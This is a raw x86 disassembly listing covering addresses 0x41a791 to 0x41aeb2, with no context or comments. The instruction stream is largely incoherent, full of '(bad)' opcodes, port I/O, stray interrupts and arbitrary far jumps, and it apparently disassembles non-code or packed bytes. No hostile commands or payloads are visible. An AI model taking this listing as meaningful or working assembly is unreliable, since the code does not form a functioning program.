  41a791:	enter  0x4f9f,0x40
  41a795:	xchg   ecx,eax
  41a796:	jge    0x41a801
  41a798:	fsubr  QWORD PTR [esi+0x236b0a2f]
  41a79e:	mov    bh,0x38
  41a7a0:	dec    ebp
  41a7a1:	cmp    eax,0x70a10a54
  41a7a6:	jmp    FWORD PTR ds:0x3e86fe16
  41a7ac:	aad    0x3f
  41a7ae:	test   BYTE PTR [edx-0x28],0xf0
  41a7b2:	imul   edx,DWORD PTR [edx+0x20],0xf8e95f3b
  41a7b9:	fiadd  DWORD PTR [ebx+0x76]
  41a7bc:	pop    edx
  41a7bd:	push   0x6c6778c3
  41a7c2:	dec    eax
  41a7c3:	retf   
  41a7c4:	fwait
  41a7c5:	mov    edx,DWORD PTR [edx+0x52]
  41a7c8:	sbb    BYTE PTR [eax],ch
  41a7ca:	jmp    0x902090a2
  41a7cf:	jb     0x41a772
  41a7d1:	xor    eax,0x640afe03
  41a7d6:	adc    esp,DWORD PTR [esi-0x11]
  41a7d9:	emms   
  41a7db:	es retf 
  41a7dd:	sub    edx,esi
  41a7df:	xor    DWORD PTR [ecx+edi*1],edi
  41a7e2:	or     eax,0xcfe7e164
  41a7e7:	fimul  DWORD PTR [eax+0x29]
  41a7ea:	dec    ebx
  41a7eb:	in     eax,0xc9
  41a7ed:	xchg   ebp,eax
  41a7ee:	mov    eax,ds:0x2434347a
  41a7f3:	mov    dl,0x88
  41a7f5:	xchg   esi,eax
  41a7f6:	rcr    DWORD PTR [ebx],cl
  41a7f8:	xlat   BYTE PTR ds:[ebx]
  41a7f9:	popa   
  41a7fa:	adc    BYTE PTR [ebx],dl
  41a7fc:	test   BYTE PTR [edi-0x2e],bl
  41a7ff:	out    dx,eax
  41a800:	xor    al,0x76
  41a802:	cs or  al,0xcd
  41a805:	cmp    DWORD PTR [ebx-0x7bb8a135],ecx
  41a80b:	pop    ecx
  41a80c:	and    edi,DWORD PTR [ecx]
  41a80e:	mov    edi,0xfd32aed3
  41a813:	sub    ebx,esi
  41a815:	mov    esi,0x6bac44de
  41a81a:	ret    0xc899
  41a81d:	arpl   WORD PTR [esi+0x55],di
  41a820:	ja     0x41a831
  41a822:	and    cl,dl
  41a824:	or     BYTE PTR [ecx+0x74262fd8],0x39
  41a82b:	jmp    0xdbab:0xe6c7669e
  41a832:	mov    bh,0x67
  41a834:	or     eax,0x18e49faf
  41a839:	ret    0xafcc
  41a83c:	mov    al,0x93
  41a83e:	sub    DWORD PTR [edx+0x3a],ecx
  41a841:	push   cs
  41a842:	dec    edi
  41a843:	test   eax,0x3ab7cf52
  41a848:	mov    bl,0x7b
  41a84a:	neg    BYTE PTR [edi+edx*2]
  41a84d:	sti    
  41a84e:	sahf   
  41a84f:	jnp    0x41a89d
  41a851:	inc    ebx
  41a852:	jmpw   0x41e8
  41a856:	pushf  
  41a857:	cmp    ecx,ecx
  41a859:	mov    bh,0x4
  41a85b:	fwait
  41a85c:	xchg   ebp,eax
  41a85d:	mov    es,WORD PTR [ebp-0x54e4ac05]
  41a863:	inc    ebx
  41a864:	or     eax,0x982a5be6
  41a869:	dec    BYTE PTR [ecx-0x52]
  41a86c:	jmp    0x269:0xa7637c89
  41a873:	cli    
  41a874:	xor    BYTE PTR [eax+0x366f3ea9],0x79
  41a87b:	mov    al,0x95
  41a87d:	(bad)  
  41a87e:	cmp    bl,al
  41a880:	into   
  41a881:	enter  0x61a6,0x93
  41a885:	dec    ebx
  41a886:	push   cs
  41a887:	and    al,0x66
  41a889:	push   ebx
  41a88a:	enter  0x112e,0x7e
  41a88e:	jns    0x41a8c3
  41a890:	ret    0xd1f8
  41a893:	stc    
  41a894:	push   edi
  41a895:	add    dl,0xc6
  41a898:	in     eax,0x44
  41a89a:	xor    BYTE PTR [edx-0x46],0xcf
  41a89e:	and    eax,0x5a0acb86
  41a8a3:	inc    ebx
  41a8a4:	push   eax
  41a8a5:	out    dx,al
  41a8a6:	(bad)
  41a8a9:	and    DWORD PTR [ecx-0x3936a9e],0xffffffff
  41a8b0:	xchg   ebx,eax
  41a8b1:	add    eax,0x7051cf8a
  41a8b6:	sti    
  41a8b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8b8:	dec    ebx
  41a8b9:	adc    DWORD PTR [ebx+0x437e12fc],ebp
  41a8bf:	cs fwait
  41a8c1:	retf   
  41a8c2:	mov    al,0x12
  41a8c4:	nop
  41a8c5:	push   esi
  41a8c6:	retf   0x2953
  41a8c9:	jecxz  0x41a900
  41a8cb:	cwde   
  41a8cc:	es scas al,BYTE PTR es:[edi]
  41a8ce:	mov    dh,0x6f
  41a8d0:	mov    ah,BYTE PTR [ebp-0x46706915]
  41a8d6:	pop    edi
  41a8d7:	clc    
  41a8d8:	cmp    bl,bl
  41a8da:	push   ecx
  41a8db:	fld    DWORD PTR [eax]
  41a8dd:	xor    BYTE PTR [edx],bh
  41a8df:	and    edx,esp
  41a8e1:	lods   al,BYTE PTR ds:[esi]
  41a8e2:	fst    DWORD PTR [ebx]
  41a8e4:	int    0x39
  41a8e6:	mov    edx,0x566a31f1
  41a8eb:	enter  0xee1f,0xd5
  41a8ef:	jae    0x41a8a1
  41a8f1:	sub    eax,0xe7cd5420
  41a8f6:	dec    ecx
  41a8f7:	push   si
  41a8f9:	dec    esi
  41a8fa:	mov    ebp,DWORD PTR [ebp-0x3f]
  41a8fd:	dec    ebx
  41a8fe:	dec    esp
  41a8ff:	push   ecx
  41a900:	aas    
  41a901:	test   al,0x87
  41a903:	stos   DWORD PTR es:[edi],eax
  41a904:	sbb    ebp,ebx
  41a906:	xor    ebx,DWORD PTR [ebp-0x68]
  41a909:	loopne 0x41a95f
  41a90b:	and    DWORD PTR [edi-0x28],ebx
  41a90e:	mov    ebx,0xd71a27e7
  41a913:	cs retf 
  41a915:	sub    DWORD PTR [edi-0x21],ebp
  41a918:	dec    edi
  41a919:	call   0xc046:0x2b1448c1
  41a920:	xchg   ebp,eax
  41a921:	mov    esp,ecx
  41a923:	inc    DWORD PTR [eax]
  41a925:	inc    ecx
  41a926:	inc    edx
  41a927:	test   BYTE PTR [bp+si+0x66],bl
  41a92b:	xchg   ebx,eax
  41a92c:	sbb    edx,DWORD PTR [ecx]
  41a92e:	xchg   ebx,eax
  41a92f:	adc    ebx,esp
  41a931:	jge    0x41a91c
  41a933:	in     eax,0x49
  41a935:	push   0x32
  41a937:	retf   
  41a938:	mov    ebp,0x12738c83
  41a93d:	mov    bh,0x94
  41a93f:	mov    WORD PTR [esi],fs
  41a941:	lods   eax,DWORD PTR ds:[esi]
  41a942:	popa   
  41a943:	xchg   edx,eax
  41a944:	(bad)  
  41a945:	arpl   WORD PTR [ecx],bx
  41a947:	stos   BYTE PTR es:[edi],al
  41a948:	sbb    BYTE PTR [eax+ecx*4+0x2e],ah
  41a94c:	fdiv   QWORD PTR [eax+0x61262f25]
  41a952:	xchg   esp,eax
  41a953:	pop    edx
  41a954:	test   eax,0x1f027fb8
  41a959:	movd   mm2,DWORD PTR [eax]
  41a95c:	fld    QWORD PTR [eax-0xf4fcd3e]
  41a962:	push   0x94f66055
  41a967:	int    0x8c
  41a969:	sub    DWORD PTR [ebp+ecx*1+0x77],ebp
  41a96d:	jecxz  0x41a906
  41a96f:	sbb    eax,0x66afd539
  41a974:	dec    edx
  41a975:	pop    edi
  41a976:	dec    ebx
  41a977:	fsub   DWORD PTR [ecx+ebp*4-0x3d]
  41a97b:	lods   eax,DWORD PTR ds:[esi]
  41a97c:	dec    ecx
  41a97d:	mov    ebp,0xd9102fc2
  41a982:	sub    eax,0x57a5c581
  41a987:	mov    al,ds:0x4d8a15a2
  41a98c:	mov    bh,0xa1
  41a98e:	(bad)  
  41a98f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a990:	lods   al,BYTE PTR ds:[esi]
  41a991:	ficomp WORD PTR ds:0xc7d05529
  41a997:	imul   edx,DWORD PTR [esi+0x5b],0x2ca8e0dd
  41a99e:	or     ecx,0x11
  41a9a1:	lods   al,BYTE PTR ds:[esi]
  41a9a2:	aaa    
  41a9a3:	fstp   TBYTE PTR [esi-0x45]
  41a9a6:	jbe    0x41aa08
  41a9a8:	int3   
  41a9a9:	mov    WORD PTR [edx-0x39ffd063],cs
  41a9af:	bndstx [eax+0x39],bnd2
  41a9b3:	(bad)  
  41a9b4:	jmp    0x270d:0x62fdf19c
  41a9bb:	(bad)  
  41a9bc:	mov    esi,0x72c8cf25
  41a9c1:	enter  0xabd6,0xe2
  41a9c5:	retf   
  41a9c6:	faddp  st(6),st
  41a9c8:	inc    ecx
  41a9c9:	or     BYTE PTR [ecx-0x69],0x5d
  41a9cd:	leave  
  41a9ce:	and    dh,BYTE PTR [ecx]
  41a9d0:	add    edx,eax
  41a9d2:	xor    ebp,DWORD PTR [eax+0x76d0b2d9]
  41a9d8:	or     eax,0x81ab8fa1
  41a9dd:	(bad)  
  41a9de:	(bad)  
  41a9df:	pop    ss
  41a9e0:	outs   dx,DWORD PTR ds:[esi]
  41a9e1:	inc    ecx
  41a9e2:	jecxz  0x41a97c
  41a9e4:	outs   dx,BYTE PTR ds:[esi]
  41a9e5:	out    dx,al
  41a9e6:	dec    ax
  41a9e8:	or     eax,DWORD PTR [ebx]
  41a9ea:	js     0x41aa28
  41a9ec:	jle    0x41a9be
  41a9ee:	dec    eax
  41a9ef:	pop    ebp
  41a9f0:	inc    eax
  41a9f1:	add    BYTE PTR [ebx+esi*8+0x4486e5cd],ah
  41a9f8:	shr    DWORD PTR [ebp+0x24],cl
  41a9fb:	pushf  
  41a9fc:	pop    esi
  41a9fd:	nop
  41a9fe:	xchg   edi,eax
  41a9ff:	xchg   esi,eax
  41aa00:	xor    eax,0x8e6c1534
  41aa05:	cld    
  41aa06:	int    0xda
  41aa08:	es push edx
  41aa0a:	xchg   ecx,eax
  41aa0b:	aas    
  41aa0c:	jp     0x41aa0f
  41aa0e:	outs   dx,DWORD PTR ds:[esi]
  41aa0f:	in     eax,0x7e
  41aa11:	jp     0x41aa8a
  41aa13:	or     al,0xa3
  41aa15:	mov    cl,0xa7
  41aa17:	leave  
  41aa18:	jbe    0x41a9e0
  41aa1a:	mov    eax,ds:0xa769e28f
  41aa1f:	retf   0x95bc
  41aa22:	jns    0x41a9cc
  41aa24:	inc    esp
  41aa25:	int    0xc6
  41aa27:	test   BYTE PTR [ebp-0x4a],0xff
  41aa2b:	pop    esp
  41aa2c:	imul   eax,DWORD PTR [edi-0x3e],0x634021a3
  41aa33:	shl    DWORD PTR [ecx+0x60],0xf9
  41aa37:	mov    WORD PTR [edi],es
  41aa39:	sub    DWORD PTR [ebx+0x30e9095f],0x6fa27808
  41aa43:	arpl   WORD PTR [edx-0xb23c420],ax
  41aa49:	shl    BYTE PTR [ebx+ecx*2+0x3f354fd3],0xef
  41aa51:	aaa    
  41aa52:	xchg   ebp,eax
  41aa53:	leave  
  41aa54:	rcr    DWORD PTR [ebx+0x74e4c602],0x15
  41aa5b:	(bad)  
  41aa5c:	mov    edx,0x67fccc8c
  41aa61:	and    eax,0x33a64f21
  41aa66:	lods   eax,DWORD PTR ds:[esi]
  41aa67:	mov    bh,0xac
  41aa6a:	xchg   ebp,eax
  41aa6b:	cmp    BYTE PTR [esi],al
  41aa6d:	push   ebx
  41aa6e:	mov    ch,0x52
  41aa70:	(bad)  
  41aa71:	(bad)  
  41aa72:	call   0x1376:0x3a43b886
  41aa79:	cli    
  41aa7a:	push   ebx
  41aa7b:	mov    ds:0xa77d82d9,eax
  41aa80:	es sbb al,0x7c
  41aa83:	mov    ch,0x97
  41aa85:	lods   al,BYTE PTR ds:[si]
  41aa87:	out    dx,eax
  41aa88:	xchg   ecx,eax
  41aa89:	shr    DWORD PTR ss:[ecx+0x2951ccec],cl
  41aa90:	xor    al,0x5c
  41aa92:	xchg   edx,eax
  41aa93:	jp     0x41aa73
  41aa95:	pop    ebp
  41aa96:	ficom  WORD PTR [edi]
  41aa98:	or     eax,0x4b4e50bf
  41aa9d:	retf   
  41aa9e:	sub    BYTE PTR [ecx],cl
  41aaa0:	dec    edx
  41aaa1:	or     bl,BYTE PTR [edx]
  41aaa3:	mov    dh,0xd6
  41aaa5:	loope  0x41aabe
  41aaa7:	mov    dl,0xe4
  41aaa9:	push   edx
  41aaaa:	es xchg edi,eax
  41aaac:	arpl   WORD PTR [eax+eax*4],dx
  41aaaf:	lock sub eax,DWORD PTR ds:0x8b8c681e
  41aab6:	jle    0x41aa57
  41aab8:	outs   dx,BYTE PTR ds:[esi]
  41aab9:	popf   
  41aaba:	js     0x41aa6d
  41aabc:	iret   
  41aabd:	push   ebx
  41aabe:	jb     0x41aabe
  41aac0:	std    
  41aac1:	out    dx,al
  41aac2:	sbb    ah,BYTE PTR [eax]
  41aac4:	bound  esp,QWORD PTR [esi]
  41aac6:	or     dl,bh
  41aac8:	jecxz  0x41ab35
  41aaca:	cdq    
  41aacb:	out    dx,eax
  41aacc:	in     eax,dx
  41aacd:	cmp    ecx,DWORD PTR [edx+eax*1]
  41aad0:	mov    DWORD PTR [eax+0x41],edi
  41aad3:	jns    0x41aad1
  41aad5:	stos   BYTE PTR es:[edi],al
  41aad6:	xchg   edi,eax
  41aad7:	xor    dh,BYTE PTR [eax+0x37de6ef2]
  41aadd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aade:	stos   DWORD PTR es:[edi],eax
  41aadf:	sbb    ch,al
  41aae1:	add    al,0xac
  41aae3:	pop    edx
  41aae4:	xchg   BYTE PTR [esi+eiz*1+0x4df773be],al
  41aaeb:	jae    0x41aafa
  41aaed:	jns    0x41ab0e
  41aaef:	(bad)  
  41aaf0:	loope  0x41aaf7
  41aaf2:	jbe    0x41ab4f
  41aaf4:	loopne 0x41aa77
  41aaf6:	dec    eax
  41aaf7:	mov    edi,0xd15dacbf
  41aafc:	rcl    ecx,0x74
  41aaff:	xor    al,0xfe
  41ab01:	or     al,0xb0
  41ab03:	and    BYTE PTR [eax+0x71e7985a],ah
  41ab09:	push   ebx
  41ab0a:	mov    esi,0x6f826ef4
  41ab0f:	mov    edi,0xe3655380
  41ab14:	fadd   st,st(3)
  41ab16:	inc    ebx
  41ab17:	or     BYTE PTR [edx],bh
  41ab19:	int    0x69
  41ab1b:	bound  esi,QWORD PTR [ecx]
  41ab1d:	mov    cl,0x37
  41ab1f:	xor    DWORD PTR [ecx],ebp
  41ab21:	retf   0x588
  41ab24:	inc    esp
  41ab25:	or     cl,BYTE PTR [esi+0x28]
  41ab28:	xor    esp,esi
  41ab2a:	loop   0x41ab3c
  41ab2c:	in     eax,0xfd
  41ab2e:	xor    di,WORD PTR [edx]
  41ab31:	ret    0xb55f
  41ab34:	scas   eax,DWORD PTR es:[edi]
  41ab35:	inc    ecx
  41ab36:	pop    ebx
  41ab37:	bound  ebx,QWORD PTR cs:[eax+0x33]
  41ab3b:	mov    edx,0x10dc3a50
  41ab40:	test   esi,ebp
  41ab42:	push   edi
  41ab43:	das    
  41ab44:	jo     0x41ab4b
  41ab46:	mov    ds:0x9909b54d,eax
  41ab4b:	aas    
  41ab4c:	(bad)  
  41ab4d:	mov    dh,0x5d
  41ab4f:	fiadd  DWORD PTR [esi-0x1da1135c]
  41ab55:	outs   dx,BYTE PTR ds:[esi]
  41ab56:	out    0x90,al
  41ab58:	sbb    eax,0xd00ed20a
  41ab5d:	in     eax,0x2d
  41ab5f:	daa    
  41ab60:	mov    al,0xd9
  41ab62:	or     ecx,DWORD PTR [edi-0x7fd092b2]
  41ab68:	pop    es
  41ab69:	pusha  
  41ab6a:	pop    DWORD PTR [edi-0x73]
  41ab6d:	mov    al,ds:0x71b9f4ff
  41ab72:	ret    
  41ab73:	nop
  41ab74:	jle    0x41ab35
  41ab76:	or     eax,0xb1068f6d
  41ab7b:	popf   
  41ab7c:	lods   eax,DWORD PTR ds:[esi]
  41ab7d:	in     eax,dx
  41ab7e:	bound  esp,QWORD PTR [esi+0x37]
  41ab81:	mov    DWORD PTR [ebx],edi
  41ab83:	push   esi
  41ab84:	add    DWORD PTR [edx+0x6e],0x61
  41ab88:	inc    edx
  41ab89:	jg     0x41abaf
  41ab8b:	std    
  41ab8c:	cwde   
  41ab8d:	add    BYTE PTR [ecx+0x3bd75372],dl
  41ab93:	test   eax,0xaab07978
  41ab98:	rcl    DWORD PTR [edi+0x16],1
  41ab9b:	mov    bl,0x95
  41ab9d:	pop    DWORD PTR [edx+0x3e]
  41aba0:	(bad)  
  41aba2:	push   ecx
  41aba3:	lods   al,BYTE PTR ds:[esi]
  41aba4:	add    DWORD PTR [ecx+ecx*2-0xa],eax
  41aba8:	sub    ebx,edi
  41abaa:	cdq    
  41abab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abac:	sub    edi,ecx
  41abae:	mov    eax,ds:0xe709ba7d
  41abb3:	cmp    DWORD PTR [edi+0x45],edx
  41abb6:	mov    ecx,0x349c1aa4
  41abbb:	es out 0x3b,eax
  41abbe:	sbb    eax,0xbe006f5e
  41abc3:	mov    esi,0x1e42c4ce
  41abc8:	xor    eax,0x49856de1
  41abcd:	dec    eax
  41abce:	icebp  
  41abcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abd0:	lahf   
  41abd1:	aaa    
  41abd2:	add    bl,bl
  41abd4:	test   DWORD PTR [ebx],ebx
  41abd6:	xchg   edi,eax
  41abd7:	sbb    al,0x96
  41abd9:	test   BYTE PTR [edx],ah
  41abdb:	jns    0x41ac21
  41abdd:	rcl    BYTE PTR [ecx],cl
  41abdf:	shl    dh,1
  41abe1:	ss jno 0x41ab97
  41abe4:	and    cl,ah
  41abe6:	out    0x13,al
  41abe8:	lods   al,BYTE PTR ds:[esi]
  41abe9:	pop    ebx
  41abea:	sub    dh,cl
  41abec:	pop    ss
  41abed:	adc    ebp,DWORD PTR [ebx+0x70ba7973]
  41abf3:	(bad)  
  41abf4:	mov    esp,0x3eb2d830
  41abf9:	xchg   ebx,eax
  41abfa:	data16 rcl dl,0x9f
  41abfe:	leave  
  41abff:	clc    
  41ac00:	push   eax
  41ac01:	mov    ebx,gs
  41ac03:	adc    bh,BYTE PTR [ebx+0x69c7217a]
  41ac09:	xchg   BYTE PTR [ebx],bl
  41ac0b:	jecxz  0x41abb3
  41ac0d:	push   esp
  41ac0e:	sbb    DWORD PTR [esi+0x4e],0x7b630f6c
  41ac15:	jl     0x41ac5f
  41ac17:	bound  ebx,QWORD PTR [eax]
  41ac19:	sti    
  41ac1a:	int    0xeb
  41ac1c:	push   ss
  41ac1d:	cwde   
  41ac1e:	mov    eax,ds:0x6f12c79e
  41ac23:	int    0xdd
  41ac25:	xor    DWORD PTR [edx-0x6b37bca],ebp
  41ac2b:	test   al,0xd4
  41ac2d:	jb     0x41ac47
  41ac2f:	sahf   
  41ac30:	push   0x7
  41ac32:	int3   
  41ac33:	aas    
  41ac34:	sub    BYTE PTR [ebp+0x5b],bl
  41ac37:	int3   
  41ac38:	(bad)  
  41ac39:	xlat   BYTE PTR ds:[ebx]
  41ac3a:	jle    0x41ac5d
  41ac3c:	inc    esi
  41ac3d:	fwait
  41ac3e:	add    BYTE PTR [eax],al
  41ac40:	add    BYTE PTR [eax],al
  41ac42:	dec    ebp
  41ac43:	dec    ebp
  41ac44:	ss retf 0xfb36
  41ac48:	std    
  41ac49:	iret   
  41ac4a:	cmp    esp,DWORD PTR [edx]
  41ac4c:	(bad)  
  41ac4d:	cld    
  41ac4e:	fwait
  41ac4f:	sbb    dl,al
  41ac51:	shr    BYTE PTR [ebp-0xbfffed8],1
  41ac57:	add    al,0x0
  41ac59:	add    BYTE PTR [ebx+0x3e],al
  41ac5c:	mov    DWORD PTR [ecx],edi
  41ac5e:	pop    edx
  41ac5f:	push   eax
  41ac60:	xor    al,dh
  41ac62:	cld    
  41ac63:	dec    ebx
  41ac64:	xor    BYTE PTR [ebx],bh
  41ac66:	push   0x1007c8fa
  41ac6b:	jle    0x41ac12
  41ac6d:	push   edi
  41ac6e:	pop    edi
  41ac6f:	jne    0x41aca1
  41ac71:	outs   dx,DWORD PTR ds:[esi]
  41ac72:	push   edi
  41ac73:	or     eax,0x3d54e97c
  41ac78:	mov    ds:0xef395a7c,eax
  41ac7d:	pop    ebp
  41ac7e:	imul   ebp,DWORD PTR [ebx-0x54edda59],0xa8ceb7a4
  41ac88:	xchg   edx,eax
  41ac89:	out    0x6e,al
  41ac8b:	jnp    0x41ac38
  41ac8d:	sbb    bh,ah
  41ac8f:	data16 cli 
  41ac91:	shld   DWORD PTR [ecx+0x494eacdd],edx,cl
  41ac98:	stc    
  41ac99:	test   BYTE PTR [edx+0x7e0762cf],al
  41ac9f:	cmp    eax,0x60dc5c04
  41aca4:	mov    bl,ch
  41aca6:	push   cs
  41aca7:	fwait
  41aca8:	inc    edx
  41aca9:	xchg   esp,eax
  41acaa:	(bad)  [ebx]
  41acac:	mov    eax,0x41130a58
  41acb1:	ret    
  41acb2:	sub    DWORD PTR [ebx],edi
  41acb4:	jae    0x41acfa
  41acb6:	imul   ebp,DWORD PTR [ebx+0x27],0x5b
  41acba:	add    bh,BYTE PTR [edi]
  41acbc:	fadd   QWORD PTR [edi+ebp*2]
  41acbf:	mov    cl,0x3b
  41acc1:	cdq    
  41acc2:	std    
  41acc3:	psrld  mm5,QWORD PTR [edx-0x73ef6b8e]
  41acca:	inc    esp
  41accb:	inc    ebx
  41accc:	xchg   ebx,eax
  41accd:	or     BYTE PTR [ebp-0x33],0x83
  41acd1:	sub    eax,0x40574bc4
  41acd6:	hlt    
  41acd7:	jo     0x41acb2
  41acd9:	pop    esi
  41acda:	out    dx,al
  41acdb:	imul   ebp,DWORD PTR [ecx-0x17],0x9
  41acdf:	aas    
  41ace0:	add    ah,0x40
  41ace3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ace4:	and    eax,DWORD PTR [ebp+ecx*8-0x1ab02346]
  41aceb:	hlt    
  41acec:	xchg   edi,eax
  41aced:	pop    eax
  41acee:	dec    esi
  41acef:	lods   al,BYTE PTR ds:[esi]
  41acf0:	push   ds
  41acf1:	pop    esp
  41acf2:	ficom  DWORD PTR [ebx-0x7fc20ff2]
  41acf8:	je     0x41ad1e
  41acfa:	adc    edi,DWORD PTR [ebx]
  41acfc:	retf   0xf2f6
  41acff:	jl     0x41acd4
  41ad01:	mov    dh,0xc8
  41ad03:	ss leave 
  41ad05:	scas   al,BYTE PTR es:[edi]
  41ad06:	ror    DWORD PTR [esi+0x3b],1
  41ad09:	mov    ebx,0xd2b39367
  41ad0e:	jge    0x41acef
  41ad10:	loopne 0x41ad81
  41ad12:	cdq    
  41ad13:	push   0x33
  41ad15:	call   0xfc7815e9
  41ad1a:	out    0x9f,eax
  41ad1c:	fsubr  QWORD PTR [ecx]
  41ad1e:	sbb    ecx,DWORD PTR [ecx+0x31b4485d]
  41ad24:	cwde   
  41ad25:	fcom   DWORD PTR [eax]
  41ad27:	or     BYTE PTR [ebx+esi*4],0x17
  41ad2b:	xchg   edx,eax
  41ad2c:	adc    ecx,DWORD PTR [ecx]
  41ad2e:	ja     0x41ad26
  41ad30:	push   ecx
  41ad31:	cs jge 0x41ada0
  41ad34:	sub    eax,0xed0c88
  41ad39:	pop    edi
  41ad3a:	clc    
  41ad3b:	ror    esi,0x6
  41ad3e:	fucomp st(4)
  41ad40:	mov    al,0xd7
  41ad42:	mov    al,ds:0xdb434457
  41ad47:	jle    0x41acd5
  41ad49:	xor    edi,ecx
  41ad4b:	pop    edx
  41ad4c:	jl     0x41ad5b
  41ad4e:	out    0x6c,eax
  41ad50:	in     al,dx
  41ad51:	mov    ?,WORD PTR [ebp-0x70]
  41ad54:	inc    eax
  41ad55:	retf   0x948a
  41ad58:	scas   al,BYTE PTR es:[edi]
  41ad59:	dec    edx
  41ad5a:	sahf   
  41ad5b:	pop    esp
  41ad5c:	push   edi
  41ad5d:	ja     0x41ad94
  41ad5f:	sbb    ecx,DWORD PTR [edi+0x5f46bab7]
  41ad65:	jmp    0x41ad0f
  41ad67:	daa    
  41ad68:	(bad)  
  41ad69:	jae    0x41ad1b
  41ad6b:	out    dx,al
  41ad6c:	jbe    0x41ad8a
  41ad6e:	push   esi
  41ad6f:	sar    DWORD PTR [eax-0x38],0x7e
  41ad73:	sbb    al,0xcb
  41ad75:	std    
  41ad76:	xor    al,0x8e
  41ad78:	push   ebx
  41ad79:	jl     0x41adf5
  41ad7b:	ds pop esp
  41ad7d:	add    DWORD PTR [ecx],esi
  41ad7f:	add    esp,DWORD PTR [edi+0x2e]
  41ad82:	fstp   QWORD PTR [ecx]
  41ad84:	inc    ecx
  41ad85:	xor    al,0x69
  41ad87:	shl    ah,0x4a
  41ad8a:	or     esp,DWORD PTR [ecx+0x7125107d]
  41ad90:	mov    eax,0x6a846e16
  41ad95:	sbb    BYTE PTR [edx+0x77],0x29
  41ad99:	jl     0x41ad62
  41ad9b:	jle    0x41ad1f
  41ad9d:	jnp    0x41ad4b
  41ad9f:	repz inc esp
  41ada1:	jno    0x41ade8
  41ada3:	sub    al,ch
  41ada5:	and    dl,al
  41ada7:	sbb    ch,dh
  41ada9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41adaa:	jge    0x41ae0f
  41adac:	pop    esi
  41adad:	mov    eax,ds:0x2692aa37
  41adb2:	jecxz  0x41ae16
  41adb4:	data16 stc 
  41adb6:	sahf   
  41adb7:	xor    al,0x5c
  41adb9:	push   ss
  41adba:	mov    dl,0x53
  41adbc:	inc    eax
  41adbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adbe:	jp     0x41ad5f
  41adc0:	sub    eax,eax
  41adc2:	aas    
  41adc3:	xchg   ecx,eax
  41adc4:	rol    BYTE PTR [ebx-0x61417eaa],cl
  41adca:	in     al,0xdc
  41adcc:	dec    eax
  41adcd:	xchg   ebp,eax
  41adce:	pushf  
  41adcf:	mov    ebx,0x7f6b74d8
  41add4:	adc    ebp,ebx
  41add6:	inc    ch
  41add8:	dec    edi
  41add9:	int3   
  41adda:	adc    BYTE PTR [ecx+edx*4],ch
  41addd:	call   0x4046fbe1
  41ade2:	sub    al,0xba
  41ade4:	mov    edi,DWORD PTR [edi]
  41ade6:	mov    cl,0x15
  41ade8:	sbb    ah,BYTE PTR [eax-0x652298e5]
  41adee:	or     eax,0xc58a23a4
  41adf3:	cmc    
  41adf4:	inc    esp
  41adf5:	and    al,0x43
  41adf7:	pop    ebp
  41adf8:	mov    ch,0x11
  41adfa:	sub    ebp,ecx
  41adfc:	jmp    0x1294:0x74f066f9
  41ae03:	sub    dl,BYTE PTR [ecx+0x23b3064a]
  41ae09:	push   0x50
  41ae0b:	jb     0x41adcc
  41ae0d:	jns    0x41ae36
  41ae0f:	push   ecx
  41ae10:	jns    0x41adc8
  41ae12:	xchg   edi,eax
  41ae13:	sbb    esi,DWORD PTR [eax+edx*4+0x6a]
  41ae17:	mov    dh,0x5
  41ae19:	sub    esi,esp
  41ae1b:	xchg   esi,ebx
  41ae1d:	cld    
  41ae1e:	mov    dh,0x8
  41ae20:	push   ds
  41ae21:	outs   dx,BYTE PTR ds:[esi]
  41ae22:	push   esp
  41ae23:	arpl   WORD PTR [edx],bx
  41ae25:	scas   al,BYTE PTR es:[edi]
  41ae26:	std    
  41ae27:	test   BYTE PTR [ebx+edx*1],0xb8
  41ae2b:	cwde   
  41ae2c:	dec    edx
  41ae2d:	iret   
  41ae2e:	sub    al,BYTE PTR [ecx-0x3b]
  41ae31:	fdivr  DWORD PTR [edi+eiz*1-0x74]
  41ae35:	sbb    al,0x3
  41ae37:	dec    edi
  41ae38:	(bad)  
  41ae39:	or     al,0x39
  41ae3b:	inc    esi
  41ae3c:	jne    0x41ae56
  41ae3e:	sub    dh,al
  41ae40:	inc    esp
  41ae41:	push   ss
  41ae42:	data16 js 0x41ae0f
  41ae45:	(bad)  
  41ae46:	xchg   edx,eax
  41ae47:	and    al,0x52
  41ae49:	scas   eax,DWORD PTR es:[edi]
  41ae4a:	pop    esp
  41ae4b:	or     eax,0xb2f1eb50
  41ae50:	cli    
  41ae51:	jnp    0x41ae1f
  41ae53:	imul   ebp,DWORD PTR [ecx-0x1817d44f],0x6ccf669e
  41ae5d:	jns    0x41ae7c
  41ae5f:	jmp    0x6eba:0x397c69dd
  41ae66:	ins    BYTE PTR es:[edi],dx
  41ae67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae68:	push   es
  41ae69:	das    
  41ae6a:	inc    edi
  41ae6b:	int3   
  41ae6c:	dec    ebx
  41ae6d:	cmp    cl,bh
  41ae6f:	(bad)  
  41ae70:	hlt    
  41ae71:	push   cs
  41ae72:	adc    BYTE PTR [esi-0x1987723a],ch
  41ae78:	and    DWORD PTR [edx-0x70719f94],edi
  41ae7e:	xchg   DWORD PTR [ebx],edi
  41ae80:	std    
  41ae81:	adc    ecx,esp
  41ae83:	clc    
  41ae84:	loop   0x41aef1
  41ae86:	mov    ah,0x82
  41ae88:	lds    esi,FWORD PTR [ecx+0x72]
  41ae8b:	inc    esp
  41ae8c:	mul    DWORD PTR [eax+0x11a38d2e]
  41ae92:	(bad)  
  41ae93:	leave  
  41ae94:	retf   
  41ae95:	push   ebp
  41ae96:	dec    eax
  41ae97:	sti    
  41ae98:	shl    DWORD PTR ds:0xe8e48857,0x6f
  41ae9f:	js     0x41af10
  41aea1:	inc    ecx
  41aea2:	jns    0x41ae58
  41aea4:	loop   0x41aeaa
  41aea6:	xchg   edi,eax
  41aea7:	repz int3 
  41aea9:	inc    edx
  41aeaa:	repnz sar DWORD PTR [edi-0x68156195],1
  41aeb1:	xchg   esp,eax
  41aeb2:	adc    DWORD PTR [esi-0x1d],ecx
